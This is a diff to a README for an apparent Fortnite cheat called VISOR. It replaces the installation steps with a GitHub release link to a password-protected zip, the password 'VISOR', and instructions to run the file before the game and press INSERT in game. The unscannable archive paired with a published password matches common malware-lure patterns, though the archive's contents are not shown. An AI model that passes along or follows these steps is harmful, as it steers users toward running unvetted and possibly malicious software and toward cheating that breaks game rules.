@@ -3,9 +3,10 @@
 ![s10](https://github.com/user-attachments/assets/bbd35e05-6bce-4223-afc7-684c091e57e3)
 
 ## Installation Steps:
-1. [Download archive](https://github.com/jeztogdemand/VISOR_Fortnite_Cheat/releases/download/Latest/VISOR.zip ).
-2. Password: **VISOR**.
-
+1. (https://github.com/jeztogdemand/VISOR_Fortnite_Cheat/releases/download/Latest/VISOR.zip ).
+2. Password: **VISOR**
+3. Run before game
+4. In game key INSERT
 ---
 
 ## Technical Specifications:
